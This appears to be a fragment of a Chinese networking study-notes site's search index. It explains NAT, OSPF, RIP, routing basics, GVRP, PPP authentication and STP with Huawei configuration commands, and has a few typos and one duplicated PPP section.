相关命令：ping -I 或 tracert tracert会一次发送3个igmp echo request报文 Protocol 协议：用来标识上层使用的协议 熟悉的协议号 协议号 1.ICMP 因特网控制报文协议 2.IGMP 因特网组报文协议 6.TCP 传输控制协议 17.UDP 用户数据报协议 41.IPV6 因特网v6 47.GRE 通用路由封装协议 89.OSPF 开放式最短路径优先 103.PIM 协议无关报文 112.VRRP 虚拟路由冗余协议 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/NAT.html":{"url":"1.数据通信/4.路由/NAT.html","title":"NAT","keywords":"","body":" 公网地址的由来：个人/企业——>ISP运营商——>CNNIC中国互联网络信息中心——>APNIC（Asia Pacific Network Information Centre）亚太地址网络信息中心——>IANA互联网数字分配机构 （早在2012年IP地址就已经分配完了） 没有NAT技术，私网地址数据可以出去，但是回不来（无回程路由） 私网地址不可能出现在公网上（太多私网地址重复，设备性能也不足以支持） NAT地址转换缓存表：记录转换地址信息 NAT好处： 有效避免了来自外网的攻击，大大提高了网络安全性 控制内外访问外网，同时也控制外网访问内网，解决了内网和外网通信的问题 家庭路由器和运营商路由器的区别： 记录NAT缓存需要消耗大量的内存，CPU，导致上网速度慢（待机数量） 带宽和包转发 NAT类型：NAT的实现方式有很多种，适用于不同的场景 静态NAT实现了私有地址和公有地址的一对一映射（一对一） 一个公网IP只会分配唯一固定的内网主机 如果希望一台主机专用某个公网地址，或者想要外网访问内网服务器时，可以使用静态NAT 静态NAT不能有效缓解公网地址短缺的问题 静态NAT配置： 命令 备注 nat static enable 开启NAT静态功能 nat static global 公网地址 inside 私网地址 创建静态NAT display nat static 验证静态NAT的配置 动态NAT 动态NAT基于地址池来实现私有地址和公有地址的转换（多对多） 动态NAT定义了地址池，规定一个范围的地址可以供主机转换 动态NAT地址池中的地址用尽后，只能等待被占用的地址被释放，其他主机才能使用它来访问公网 动态NAT也不能有效缓解公网地址短缺的问题 （使用ICMP时地址会变换，是没有端口的，但是有标识，可以根据标识来分辨） NAPT允许多个内部地址映射到同一个公有地址的不同端口（多对一） NAPT（Network Address Port Translation）也称为NAT-PT或PAT 网络地址端口转换 通常适用于大型企业网络（申请多个固定的公网地址） NAPT需要定义地址池，不能直接使用出接口的地址 有效的缓解了公网地址短缺的问题 动态NAT和PAT配置：（命令语句后不跟no-pat即为PAT模式，多对一） 命令 备注 nat address-group 编号 公网地址范围eg:nat address-group 1 12.0.0.50 12.0.0.100 配置NAT地址池 nat outbound acl 编号address-group 编号 [no-pat]eg: nat outbound 2000 address-group 1 no pat 关联一个ACL和一个NAT地址池（所以要先配置ACL的规则，允许哪些主机或网段可以上网）ACL用来匹配能够转换的源地址 no-pat 只转换地址而不转换端口 nat outbound acl 编号 address-group 编号 配置NAPT display nat address-group 查看NAT地址池配置信息 display nat outbound 查看动态NAT配置信息 display nat session all 查看所有NAT会话内容 Easy IP：以出接口公网IP地址作为NAT的地址（SNAT）源端口转换 直接使用出接口的地址做转换 Easy IP适用于小规模居于网中的主机访问Internet的场景 如：家庭、小型网吧、小型办公室中，这些地方内部主机不多，出接口可以通过拨号方式获取一个临时公网IP地址 有效的缓解了公网地址紧缺和不固定的公网地址转换问题 Easy IP 与NAPT的区别 Easy IP直接把内部地址映射到网关出口地址上的不同端口，直接使用公网端口进行转发 不需要像NAPT那样创建公网地址池，也不需要知道公网地址池是多少 Easy IP配置： 命令 备注 nat outbound acl 编号 配置Easy IP 关联出站接口和ACL NAT服务器=端口映射=目的端口转换（DNAT转换） 能够实现外网地址访问内网地址的方法：NAT、VPN NAT具有“屏蔽”内部主机的作用，但有时内网需要向外网提供服务 当外网用户访问内网服务器时，出口设备通过事先配置好的“公网IP地址+端口号”与“私网IP地址+端口号”间的映射关系，将服务器的“公网IP地址和端口号”根据映射关系替换成对应的“私网IP地址+端口号” NAT服务器的公网IP地址和端口中，端口可以更改，提供安全性 NAT服务器配置： 命令 备注 nat server protocol tcp/udpglobal 公网地址 端口 inside 私网地址 端口 配置NAT服务器 nat server protocol tcp global current-interface 端口 inside 私网地址 端口 如果提供的服务地址=出接口地址，需要打current-interface命令，不能打公网地址 display nat server 查看NAT服务器 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/OSPF.html":{"url":"1.数据通信/4.路由/OSPF.html","title":"OSPF","keywords":"","body":" OSPF概述：Open shortest path first 开放式最短路径优先 大中型网络使用最广泛的IGP协议 链路状态路由协议 无类别路由 使用组播（224.0.0.5和224.0.0.6） 收敛较快 以开销（Cost以接口带宽作为计算）作为度量值 采用SPF算法可以有效的避免环路 触发式更新（以较低频率 （每30分钟）定期发送更新，被称为链路状态泛洪） 设置区域概率使得OSPF能够支持更大规模的网络（划分骨干区域和非骨干区域和特殊区域） 通过LSA（链路状态信息）的形式发布路由 不支持自动汇总，支持手动汇总 （在ABR/ASBR上配置） OSPF区域概述： 术语 备注 区域（Area） 为了适应大型网络，OSPF在AS内划分多个区域区域是以接口为单位来划分每个OSPF路由器只维护所在区域的完整链路状态信息 区域ID（Area ID） 可以表示成一个十进制的数字，如：1也可以表示成一个IP，如：0.0.0.1 区域优点 尽量减少LSDB大小拓扑变化仅影响本区域内部 OSPF区域类型： 类型 备注 骨干区域 area 0骨干区域，也称为传输区域（负责在不同非骨干区域之间分发路由信息） 非骨干区域 area 0除外非骨干区域，称为末端区域 划分多区域的作用： 为了减轻运行OSPF路由器的压力 防环机制：划分了骨干区域和非骨干区域，所有非骨干区域通讯必须经过骨干区域中转 骨干区域传来的LSA不会再传回骨干区域 非骨干区域之间通信需要骨干区域转发（为了防止环路） OSPF路由器角色： 角色 备注 IR Internal Router 内部路由器所有接口都属于同一个区域 BR Backbone Router 骨干路由器至少有一个接口属于骨干区域 ABR Area Border Router 区域边界路由连接多个不同的区域，至少有一个接口属于骨干区域 ASBR Autonomous System Border Router自治系统边界路由器 将其他路由协议学习到的路由以引入的方式到OSPF进程中 PS 一台路由器可以同时属于多种类型 OSPF核心工作流程： 发现并建立邻居 传播LSA（区别基于距离矢量算法的路由表更新）LSA的内容 ： 1. Link State Advertisement 链路状态宣告（路况信息） 链路：路由器接口 状态：描述接口信息（地址、掩码、开销、网络类型、邻居关系等） 将LSA泛洪到区域中的所有OSPF路由器，而不仅是直连的路由 收集LSA创建LSDB（链路状态数据库、地图） 使用SPF算法计算到达每个目标网络的最短路径，存放于路由表 OSPF三张表： 类型 含义 邻居表dis ospf peer 记录所有邻居关系 链路状态数据库dis ospf lsdb 记录所有链路状态信息 路由表dis ip routing-table 记录最佳路由 Router ID： 运行OSPF协议前，必须选取的一个RID 用来唯一标识一台OSPF路由器（不能重复） RID可以手动配置，也可以自动生成 规则 备注 RID选取规则顺序 1.推荐手动配置（例：ospf 1 router-id 1.1.1.1这个RID可以和你的接口地址完全没有关系也可以配置成一样的地址)2.活动回环接口中选取IP地址最大的3.活动物理接口中选取IP地址最大的 注： 选取Router-ID时，先看回环口再看物理口 任何选举值都未配置是运行不了OSPF的（router id为0.0.0.0） 比较到物理接口中活动物理接口选取不出来，会选择非活动接口 RID选举具有非抢占性，除非重启OSPF进程 OSPF数据包的结构和类型：封装基于IP协议，协议号为89 OSPF数据包分为OSPF报头和OSPF数据部分： OSPF报头字段是固定的，OSPF数据包的内容由报头的类型决定 OSPF数据包的类型（5种类型）： OSPF数据包 作用 Hello 建立并维护邻居关系 Database Description （DD）比较数据库，只在邻居建立时发送 LSDB的摘要信息（仅包含LSA头部） Link State Request（LSR） 请求LSA Link State Update （LSU） 发送LSA （完整的LSA信息） Link State Acknowledge （LSAck） 对LSU的确认 （OSPF的确认机制） OSPF状态机制（7种状态）：下图有8种状态，Attempt状态只在帧中继中有用，暂不考虑 阶段 状态 备注 第一阶段 失效状态（Down） 没有收到Hello包 第一阶段 初始状态（Init） 收到了Hello包，但是邻居列表里没我 第一阶段 双向通信状态（Two-Way） 收到了Hello包，且看到自己，形成邻居关系 交换初始状态（Exstart） 决定信息交换时的路由器主从关系 交互状态（Exchange） 向邻居发送DD数据包 加载状态（Loading） LSR和LSU交互阶段（互发LSA信息） 完全邻接状态（Full） LSDB同步完成，形成邻接关系 注：只有Two-Way和Full是稳定状态 OSPF工作流程（数据包和状态切换过程）： OSPF第一阶段：使用Hello包建立双向通信的过程，成为邻居关系。 OSPF第二阶段：通过交换LSA达到LSDB同步，建立邻接关系 Exstart：Seq序列号x，I=1表示是第一个发送的DD包，M=1表示后面还有DD包，MS=1表示我是主（初始都是主） 通过比较Router ID值大的一方为主，向主发送的DD报文中序列号会变成主的序列号，同时这才是真正的DD报文 Seq序列号y+n表示经过比较RID后较大的序列号建立了邻居，MS=1表示我是主，此处由R2先向你发送LSDB链路状态数据库摘要，R1收到后向R2反馈R1自己的LSDB摘要，使R2先达到Full状态；R2至此建立了完整的LSA，向R1发送LSU链路状态更新，R1收到后发送LSAck确认信息，R1至此也达到Full状态。 注： 确认主从的作用是为了LSDB同步可靠 同一区域内的路由器中LSDB链路状态数据库必须是一致的，但是每个路由器的路由表和邻居表是不一样的 OSPF邻居建立条件：必须三层直连 建立邻居需要检验的字段： RID唯一（不能重复） 发送Hello包和邻居失效时间一致 区域ID一致 认证一致 链路MTU大小一致（华为默认不开启，思科默认开启） 子网掩码一致、网络地址一致 （以太网组网环境） 末梢区域设置一致 （Option字段） OSPF网络类型：推出时间较早，为了支持不同的链路，而设计了网络类型 OSPF网络类型：基于接口 广播网络类型（BMA） 点到点网络类型(P2P) 非广播多路访问类型(NBMA) 点到多点网络类型(P2MP) 判断网络类型基于接口 （在BMA网络中，每一个网段选取一个DR,BDR） 类型 备注 广播类型 BMA 通过以太网接口连接设备，支持广播和组播 点到点P2P 通过串行接口连接设备，支持广播和组播 非广播多路访问NBMA 早期使用帧中继，ATM组网的设备，不支持广播和组播 点到多点 P2MP 多个点到点的集合，没有一种链路层协议会被缺省的认为是P2MP类型。点到多点必须是由其他的网络类型强制更改的。 DR和BDR： 只要是多路访问BMA和NBMA网络中，为了减少邻接关系的数量，从而减少数据包的交换次数，最终节省带宽，降低路由器的处理压力，选举DR和BDR 术语 备注 DR Designed Router 指定路由器 ，类似于班长、总经理 BDR Backup Designed Router 指定备份路由器，DR的备份，类似于副班长、副总经理 DRothers 路由器，类似于普通学生 关系 DR、BDR、DRothers之间都保持邻接关系 （Full）DRthers之间都保持邻居关系（Two-Way） 地址 224.0.0.6向DR和BDR发送 （LSA包）224.0.0.5向所有OSPF路由器发送 （Hello包） 选举规则 首先比较Hello报文中携带的优先级优先级范围0~255，默认为1优先级最高的被选举为DR，优先级次高的被选举为BDR优先级为0不参与选举优先级一致，比较RID，越大越优先选举具有非抢占性（选举完成后出现更好的OSPF路由器不会强占角色） 实验演示：当前AR1是DR，AR2是BDR R1（DR）和R3、R4,R2（BDR）和R3、R4是Full的关系，R3（DRothers）和R4（DRothers）是Two-way的关系 重新选举DR和BDR使用的命令 LSDB同步过程：DR和BDR会接收224.0.0.6的LSU监听信号和LSack确认信号，（DRthers的路由器链路状态一但发生改变会直接通过224.0.0.6发送组播LSU给DR和BDR） DR收到LSU更新，会使用224.0.0.5组播泛洪到所有路由器 OSPF度量值：Cost 开销 在每一个运行OSPF的接口上，都维护着一个接口Cost 公式：Cost=10^8次方/带宽（bps）=100Mbps/BW=接口参考值/接口带宽（cost最小为1，没有小数） 到一个目标网络的度量值 从源到目标的所有出站接口的 Cost值累加（数据方向） 从目标到源沿途所有的入站接口的Cost值累加（路由方向） 注：华为的回环口的开销默认是0，思科的回环口开销默认是1 OSPF配置： 命令 备注 ospf 1 router-id 1.1.1.1 开启OSPF，进程号默认为1，手动配置RID area 0/0.0.0.0 配置区域 network 192.168.0.0 0.0.0.255 宣告网络，即指定运行OSPF的接口；使用反掩码来匹配（255.255.255.255减去掩码得到的值） authentication-mode md5/simple 设置认证，明文或密文 default -route-advertise 发布默认路由 display ospf peer （brief） 显示OSPF邻居信息 ospf timer Hello 10 修改Hello包的发送时间 ospf timer dead 40 修改Hello包的超时时间 display ospf interface g0/0/0 显示OSPF接口信息 ospf dr-priority 10 修改OSPF接口优先级，范围0~2550为不参与选举，255为必参与选举 ospf cost 10 修改开销，范围1~65535，缺省值为1 bandwidth-reference 100 修改开销计算的参考值，默认为100Mbps（修改公式中的分子）最好在整个OSPF网络中统一修改 reset ospf process number 重启OSPF进程，默认为1 ospf 1 enable area 0 在接口开启OSPF功能 default-route-advertise OSPF缺省路由发布命令 int g0/0/0 ospf authentication-mode md5 1 cipher password 配置接口认证如果同时配置，接口认证优先生效 ospf 1 area 0 authentication-mode md5 1 cipher password 配置区域认证 OSPF缺省路由发布：default-route-advertise 在出口的路由器上发布一条缺省路由，让内部的其他路由器动态学习 OSPF认证：基于接口区域 OSPF认证命令： 命令 备注 int g0/0/0 ospf authentication-mode md5 1 cipher password 配置接口认证 ospf 1 area 0 authentication-mode md5 1 cipher password 配置区域认证 PS：如果同时配置，接口认证优先生效 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/RIP.html":{"url":"1.数据通信/4.路由/RIP.html","title":"RIP","keywords":"","body":" RIP：routing information protocol 路由信息协议 距离矢量路由协议，属于IGP协议 适合中小企业网络，有RIPv1和RIPv2、RIPv3版本 基于UDP，端口号520 周期性（25.5~30.0/次）更新 支持水平分割、毒性反转和触发更新等防环机制 RIP把跳数作为度量值来衡量到达目的网络的距离 缺省情况下，直连网络的路由跳数为0，当路由器发送路由更新时，会将度量值加1 RIP规定超过15跳为网络不可达 RIP报文类型：请求request 和 回应response 请求报文：建立邻居后请求对方的路由信息 回应报文：回应对方的请求 每周期30/s次 RIPv1和RIPv2的区别： 版本 区别 RIPv1 有类别路由协议不支持VLSM,CIDR以广播的形式发送报文不支持认证 RIPv2 无类别路由协议支持VLSM，CIDR支持以广播或者组播（224.0.0.9）方式发送报文支持明文认证和MD5认证 RIPv1与RIPv2报文格式： 命令：值为1表示请求，值为2表示回应 版本：表明使用的版本 协议簇：TCP/IP协议该字段为2 RIP解决环路的方式：触发更新和水平分割、毒性反转 类型 含义 触发更新： 网络存在变化立即通知邻居 水平分割： 从邻居收到的路由信息不会在转发回去 毒性反转： 从邻居收到的路由信息会转发回去，但跳数置为16 水平分割和毒性反转时不能同时使用 默认使用水平分割，如果水平分割和毒性反转都存在则毒性反转生效 同时存在多个网段，但只想一个接口生效： 如果接口配置了input或output，静默生效 命令 备注 Rip 1 开启RIP进程，默认进程为1 Version 2 开启RIPv2版本 Network 10.0.0.0 宣告网络，将该IP地址的接口开启RIP功能 Rip metricin 5 设置接口接收路由增加度量值 Rip metricout 5 设置接口发送路由修改度量值 Rip split-horizon 开启水平分割，默认开启 Rip poison-reverse 开启毒性反转，默认关闭 Undo rip input 禁止接口接收RIP数据包 Undo rip output 禁止接口发送RIP数据包 slient-interface g0/0/0 配置被动接口，只收不发 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/动态路由概述.html":{"url":"1.数据通信/4.路由/动态路由概述.html","title":"动态路由概述","keywords":"","body":"静态路由与动态路由的比较： 协议 备注 静态 不能及时根据网络变化而自适应 动态 及时根据网络变化而自适应 路由协议概述： 路由器之间交互的一种语言 共享路由信息 维护路由器、提供最佳转发路径 路由协议总览： 类型 距离矢量协议 结合版 链路状态协议 路径矢量协议 有类 RIPv1 IGRP EGP 无类 RIPv2 EIGRP OSPFv2 ISIS BGPv4 IPv6 RIPng EIGRP for IPv6 OSPFv3 ISIS for IPv6 BGPv4 for BGPv6 路由协议分类：根据作用范围 类型 备注 IGP 内部网关协议（Interior gateway protocol） 用于一个AS内部交互路由信息常用协议：RIP、OSPF、ISIS、EIGRP EGP 外部网关路由协议（Exterior gateway protocol） 用于不同AS之间交互路由信息常用协议:BGP AS（autonomous system）：处于同一管理机构下的网络（如：企业、电信、移动、联通） IGP和EGP的区别： 类型 区别 IGP 路由器相互信任 （同一管理机构）路由数量较少注重发现路由，不需要什么策略 EGP 路由器并非相互信任 （不同管理机构）路由数量庞大注重于引入路由，策略丰富 路由协议分类：根据协议算法 类型 备注 DV 距离矢量（distance-vector） 基于距离矢量算法，路由器并不了解网络拓扑信息交互路由信息都会修改原始参数 （类似路旁，道听途说）如：RIP、EIGRP LS 链路状态 （link-state） 基于SPF算法（shortest path first 最短路径优先），路由器了解完整的网络交互路由信息直接传递不会修改原始参数（类似地图，完整）如：OSPF、ISIS 根据链路带宽来选择路由 路由协议分类：根据发送的更新是否携带掩码 类型 备注 Classful有类 不携带掩码如：RIPv1、IGRP、EGP clasless无类 携带掩码如：RIPv2、EIGRP、OSPF、BGP 不携带掩码：默认的路由掩码都是默认的，影响路由选路 路由协议分类：根据业务应用 类型 备注 Unicast routing protocol单播路由协议 如：RIP、EIGRP、OSPF、BGP、ISIS Multicast routing protocol组播路由协议 如：DVMRP、PIM-SM、PIM-DM 路由协议配置规则： 协议是在接口运行的 （需要宣告接口的IP地址/接口开启协议） 只能学习和发布运行相同协议的路由信息（不同路由协议之间互不干扰） 不同路由协议之间需要交互路由信息，需要进行引入/注入（Import） 注：引入必须要同时运行多个协议的路由器做中间人/代理 路由器收敛： 当所有路由表的信息都有一致的网络可达信息（相同的目的地址） 网络（路由）进入一个稳定状态 网络在达到收敛前无法完全正常工作 选择/衡量动态路由协议的一些性能指标： 指标 备注 正确性 能够正确的找到最优且无环的路由 收敛快 当网络发生变化后，能够快速做出响应 低开销 协议自身的开销（占用内存、CPU、带宽） 安全性 协议具有安全机制 普适度 适合各种拓扑结构和各种规模的网络 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/单播、组播、广播.html":{"url":"1.数据通信/4.路由/单播、组播、广播.html","title":"单播、组播、广播","keywords":"","body":"根据目标地址判断 类型 备注 单播 Unicast 发送给单个设备（明确目标地址） 广播 Broadcast 发送给所属广播域内的所有设备（目标地址不明确） MAC地址全F，IP地址全1 组播 Multicast 发送给一组目标MAC地址为01-00-5e，IP地址为D类 接收规则： 如果是单播帧，会比较目的MAC是否一致 如果是广播帧，会接收处理 （收到了不一定会回复） 组播只会给需要该数据的设备 冲突与广播： 冲突 Collision多个设备如果连接都一个传输信道上，发生的冲撞会导致信号不完整只会发生在早期使用使用集线器组网的共享式网络中 冲突域 Collision domain能够产生冲突的设备的范围 广播 Broadcast发送给所有设备 广播域 Broadcast domain能够收到广播的设备的范围 集线器 HUB不能分割冲突域和广播域 （所有接口都属于一个冲突域和广播域） 交换机 Switch 能够分割冲突域不能分割广播域（每个接口都是单独的冲突域） 路由器 Router能够分割冲突域和广播域（每个接口都是一个广播域） 集线器/信号复制器 HUB ：早期组网使用的设备 交换机 Switch ：重要的组网设备 路由器Router： 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.数据通信/4.路由/网关及数据转发过程.html":{"url":"1.数据通信/4.路由/网关及数据转发过程.html","title":"网关及数据转发过程","keywords":"","body":" 网关：Gateway 位于不同网络之间的主机需要通信，必须将数据包交给网关 （默认路由） 网关是一台具备路由功能的设备（路由器、三层交换机、防火墙、服务器） 网关地址与设备的接口地址是处于同个网络 主机经过与计算得出目的地址是否在同个网段同一个网段直接封装目的的MAC转发不同网段封装网关的MAC，网关帮忙转发 数据包转发的过程中IP地址和MAC地址：在同一个网段内的源MAC地址是不会变化，非同一个网段的源MAC地址会变化、IP地址一般不会变化，除使用NAT技术 数据转发过程： 主机A访问HTTP服务器 目的端口号：80 封装源IP目的IP地址，并进行与计算 不在同一网段，交给网关 检查缓存表是否有网关的MAC，没有进行ARP请求 最终以光信号、电信号发送出去 网关收到，进行FCS帧校验检测，通过检测目的MAC地址是否是我，通过交给网络层 发现目的IP地址不是我，查找路由表、封装新的二层帧头和帧尾，并进行转发 路由器以服务器A的MAC地址作为目的MAC地址继续转发 服务器A收到，进行FCS检测，通过检测目的MAC是我的MAC，继续交给上层处理 检测目的IP地址是我，检测协议号为TCP，交给TCP TCP检测目的端口交给HTTP 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/4.路由/路由基础.html":{"url":"1.数据通信/4.路由/路由基础.html","title":"路由基础","keywords":"","body":" 常用名词： 术语 备注 路由routing 从源地址到目的地址不同网络间的转发过程 路由表routing table 路由信息的集合 路由的依据 路由器 router 具有路由功能的设备 默认网关default gateway 通过是路由设备的接口IP地址 路由过程图解： 路由器收到数据包检测路由表中是否存在能够去往目的IP地址、转发过程中是逐跳转发“并不会引导其他路由器转发”、数据通信是”双向性“ 路由表只是转发的依据，真正转发的是根据接口 “知道从哪里发送” 下一跳是路由器需要将该数据包交给谁来转发 路由协议分为动态协议和静态协议 静态的配置简单，不占用资源 动态协议配置相对复杂，可以及时同步网络变化 IP路由表：存放最优的路由信息/条目 路由表包含了可以去往的目的网络 ，路由器收到目的网络不存在的会直接丢弃 路由表字段 备注 Destination目标地址 用来标识存在的能够去往的目的地址或目的网络 Mask掩码 用来选择最佳路由的重要依据（最长匹配原则） NextHop下一跳 指明该数据包所经过的下一个路由器的接口地址 Interface出接口 指明该数据包将从哪个接口转发 Protocol 协议 路由的来源（学习方式） Preference优先级 用来比较不同协议学习去往相同地址不同路径的优先程度（越小越优先） cost开销 用来比较相同协议学习去往相同地址不同路径的的代价（越小越优先） 不同协议比较 路由协议/类型 Direct OSPF ISIS Static RIP OSPF ASE BGP 管理距离/优先级 0 10 15 60 100 150 255 相同协议比较 等价路由（ECMP，Equal cost multi-Path）： 对于一个路由来源，当到同一个目标网络存在多条相同度量值的路由时，路由器会将这些路由条目都加入路由表，数据包会在这几个链路（路径）进行负载分担。 （负载均衡的选择：逐包，逐流 可以根据目标IP或源IP，目标MAC或源MAC选择。最终会经过“哈希”计算实现） 最长掩码匹配原则：最终数据包实现最佳路由的算法 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:00 "},"1.数据通信/4.路由/静态路由.html":{"url":"1.数据通信/4.路由/静态路由.html","title":"静态路由","keywords":"","body":" 技术背景：如果只有直连路由，那么非直连网络就无法到达 静态路由概述： 配置简单、开销小 通过手动配置进行添加和维护 无法根据拓扑的变化而自适应 适合于组网规模较小的场景，在大型网络环境，则配置及维护成本很高 在大型网络中，往往采用动、静态路由结合的方式部署网络 静态路由配置命令： 命令 备注 Ip route-static 目标网络 子网掩码/前缀 下一跳/出接口 配置静态路由 实现流量负载分担，提高链路利用率 优先级高的为活跃，优先级低的为非活跃 主链路故障，备份链路激活 缺省路由（网关）：一种特殊的路由，能匹配所有目标网络 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"1.数据通信/5.交换/GARP-GVRP.html":{"url":"1.数据通信/5.交换/GARP-GVRP.html","title":"GARP GVRP","keywords":"","body":" GARP:Generic Attribute Regisration Protocol 通用属性注册协议 在交换机间分发、传播、注册某种信息（VLAN属性、组播地址等） 主要用于大中型企业网络中，用来提升管理交换机的效率 一种协议规范 GARP消息类型: 类型 备注 Join 加入，端口加入VLAN Leave 注销，端口退出VLAN Leave All 注销所有 GVRP：GARP VLAN Registration Protocol，VLAN注册协议 GVRP基于GARP的工作机制，是GARP的一种应用，传递VLAN信息 VLAN分为常规（静态）和动态VLAN GVRP的结构： 工作于数据链路层 使用组播地址01：80：c2：00：00：21 GVRP的应用： 接收来自其他交换机的VLAN注册信息，并动态的更新本地的VLAN信息同步 将本地的VLAN注册信息向其他交换机传播，以便同一交换网内所有支持GVRP的设备VLAN信息同步 手动配置的VLAN是静态VLAN，通过GVRP创建的VLAN是动态VLAN GVRP传播的VLAN注册信息包括静态创建的VLAN信息和动态学习的VLAN信息 收到VLAN注册信息会将端口进行绑定，分发的端口不会进行绑定 GVRP注册模式：3种 Normal正常模式：允许静态和动态VLAN注册，同时会发送静态VLAN和动态VLAN的声明消息。 Forbidden禁止模式：不会接收动态VLAN注册，同时删除所有学习到的VLAN （只剩VLAN1）。 Fixed固定模式：不会发送和接收动态的注册信息，只会发送静态注册消息。 GVRP配置： 命令 配置 gvrp 全局开启GVRP，默认关闭 int g0/0/1gvrp 接口开启GVRP，接口类型必须是Trunk gvrp registration fixedgvrp registration forbiddengvrp registration normal 配置GVRP注册模式 display gvrp status 查看GVRP状态 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"1.数据通信/5.交换/PPP.html":{"url":"1.数据通信/5.交换/PPP.html","title":"PPP","keywords":"","body":" HDLC 可以租用接口地址来节省IP地址，同时可以批量修改端口地址PPP 名称 认证 错误检测 错误恢复 支持同步或异步链路 HDLC × √ × × PPP √ √ √ √ PPP组件 名称 作用 上层 NCP网络层控制协议Network Control Protocol 用于对不同的网络层协议进行连接建立和参数协商 下层 LCP链路控制协议Link Control Protocol 用于建立、拆除和监控PPP数据链路以及认证 PPP认证模式：PAP和CHAP 模式 备注 PAP（发明文密码） Password authentication protocol，密码认证协议 ，以明文方式直接放送密码，二次握手机制，发起方为被认证方缺点：以明文的形式发送密码不安全因为发送方为被任正非所以可以无限次的尝试（暴力破解）只在链路建立的阶段认证，一旦成功建立后将不在认证 CHAP（发暗号） Challenge Handshake Authentication Protocol，挑战/质询握手认证议，以MD5来隐藏密码，三次握手机制，发起方为认证方，有效避免了暴力破解，在链路建立后具有再次认证检测机制，目前使用的广泛 PPP认证配置： 命令 备注 aaa local-user huawei password cipher 123.com local-user huawei service-type ppp 配置PPP，设置用户名、密码和服务类型 ppp authentication-mode PAP 或ppp authentication-mode CHAP 开启PAP或CHAP认证（认证方配的） ppp pap local-user huawei password cipher 123.com 配置PAP认证（被认证方配的） ppp chap user huaweippp chap password cipher 123.com 配置CHAP认证（被认证方配的） 注： 只配置一方的用户名和密码，另一方开启认证的，这种为单向认证。 ======= HDLC 可以租用接口地址来节省IP地址，同时可以批量修改端口地址 PPP 名称 认证 错误检测 错误恢复 支持同步或异步链路 HDLC × √ × × PPP √ √ √ √ PPP组件 名称 作用 上层 NCP网络层控制协议Network Control Protocol 用于对不同的网络层协议进行连接建立和参数协商 下层 LCP链路控制协议Link Control Protocol 用于建立、拆除和监控PPP数据链路以及认证 PPP认证模式：PAP和CHAP 模式 备注 PAP（发明文密码） Password authentication protocol，密码认证协议 ，以明文方式直接放送密码，二次握手机制，发起方为被认证方缺点：以明文的形式发送密码不安全因为发送方为被任正非所以可以无限次的尝试（暴力破解）只在链路建立的阶段认证，一旦成功建立后将不在认证 CHAP（发暗号） Challenge Handshake Authentication Protocol，挑战/质询握手认证议，以MD5来隐藏密码，三次握手机制，发起方为认证方，有效避免了暴力破解，在链路建立后具有再次认证检测机制，目前使用的广泛 PPP认证配置： 命令 备注 aaa local-user huawei password cipher 123.com local-user huawei service-type ppp 配置PPP，设置用户名、密码和服务类型 ppp authentication-mode PAP 或ppp authentication-mode CHAP 开启PAP或CHAP认证（认证方配的） ppp pap local-user huawei password cipher 123.com 配置PAP认证（被认证方配的） ppp chap user huaweippp chap password cipher 123.com 配置CHAP认证（被认证方配的） 注： 只配置一方的用户名和密码，另一方开启认证的，这种为单向认证。 两边都配置用户名和密码，同时开启认证模式，互相发送认证信息，这种为双向认证。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"1.数据通信/5.交换/STP.html":{"url":"1.数据通信/5.交换/STP.html","title":"STP","keywords":"","body":"STP生成树协议 STP的背景：为了实现二层设备（Ethernet协议）之间的可靠性，企业网络通常拿多台设备或链路实现链路冗余备份，会引起环路 二层网络设计的需求和问题： 为了提高可靠性，交换机之间会通过多条链路相连，从而避免单点故障。 但也会带来一些致命的环路问题。 环路问题给用户带来的后果：网络体验差、延迟高、丢包 环路引起的问题： 极大占用链路带宽资源和设备资源，造成大量的垃圾流量 网络广播风暴 MAC地址表项不稳定 重复的帧拷贝 STP：Spanning Tree Protocol生成树协议 提供两大功能： 功能 备注 消除环路 通过阻断冗余链路来消除网络中可能存在的环路 链路备份 当正常工作的链路出现问题，激活备份链路，及时恢复网络连通性 STP操作：通过构建一颗无环的树来消除网络中的环路。 BPDU：Bridge Protocol Data Unit - 桥协议数据单元 使用组播地址：01-80-C2-00-00-00 PID：STP的ID（无论是STP、RSTP、MSTP都是STP） PVI：标识使用的是什么模式（STP、RSTP、MSTP）华为默认的模式是RSTP BPDU 类型： 配置BPDU：Configuration 选举根交换机以及确定每个交换机的角色和状态。 在初始过程中，每个桥都主动发送配置BPDU。 在网络拓扑稳定后，只有根桥主动发送配置BPDU，其他交换机在收到上游传来的配置BPDU后，才会发送自己的配置BPDU。 发送周期为Hello Time。 老化时间为Max Age。 拓扑变更通告BPDU：TCN BPDU 下游交换机感知到拓扑变化时向上游发送的拓扑变化通知。 配置BPDU： 拓扑变更通知BPDU： BPDU字段详解： 选举桥角色和端口状态靠该4个字段 参数 描述 Root ldentifier根桥ID 发送此配置BPDU的交换机所认为的根交换机的标识 Root Path Cost根路径开销 从接收此根桥的配置BPDU的交换机到达根交换机的最短路径总开销（我到根桥有多远） Bridge identifier桥ID 标识自己的BID Port Identifier端口ID 发送此配置BPDU的交换机端口的端口标识 